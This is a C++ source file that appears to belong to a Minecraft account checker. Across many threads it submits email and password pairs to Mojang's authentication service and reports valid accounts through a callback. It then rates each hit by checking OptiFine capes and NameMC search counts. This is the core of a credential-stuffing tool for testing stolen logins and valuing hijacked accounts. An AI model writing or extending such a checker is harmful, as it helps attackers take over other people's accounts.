#include "main.h"

DWORD WINAPI mcThread(LPVOID lpThreadParameter) {

    Json::Value data = Minecraft::CheckAccount("email", "parola");

    if (!data || data["error"]) return 1;

    string player_name = data["selectedProfile"]["name"].asString();

    data["nickname"] = player_name;

    if (Minecraft::CheckCape(player_name.c_str())) {
        data["cape"] = true;
    }

    Callbacks::OnAccountFound(CHECKER_MINECRAFT, "email", "parola", data);

	return 1;
}

void Minecraft::Initialise(int threads)
{
	for (int i = 0; i < threads; i++)
	{
		CreateThread(NULL, NULL, mcThread, NULL, NULL, NULL);
	}
}

Json::Value Minecraft::CheckAccount(const char* email, const char* password) {
    Json::Value data;
    Json::Value agent;

    agent["name"] = "Minecraft";
    agent["version"] = 1;

    data["agent"] = agent;

    data["username"] = email;
    data["password"] = password;

    data["clientToken"] = Minecraft::CLIENT_TOKEN;

    Json::Value received = Postman::getInstance()->postJson(Minecraft::MOJANG_AUTH, data);

    return received;
}

bool Minecraft::CheckCape(const char* nickname) {
    char capeLink[256];
    sprintf_s(capeLink, "%s%s.png", Minecraft::OPTIFINE_SEARCH, nickname);

    string received = Postman::getInstance()->get(capeLink);

    if (received.find("Not found") == std::string::npos) return true;

    return false;
}

int Minecraft::GetMonthlyViews(const char* nickname) {
    char namemcLink[256];
    sprintf_s(namemcLink, "%s%s", Minecraft::NAMEMC_SEARCH, nickname);

    std::string received = Postman::getInstance()->get(namemcLink);

    std::regex re("Searches: [0-9]*");
    std::cmatch searches_string;

    std::regex_search(received.c_str(), searches_string, re);

    if (searches_string.size() <= 0) return 0;

    vector<std::string> searches = Utils::string_split((char*)searches_string[0].str().c_str(), ": ");

    if (searches.size() <= 0) return 0;

    return atoi(searches[1].c_str());
}

Json::Value Minecraft::GetHypixelStats() {

    return Json::Value();
}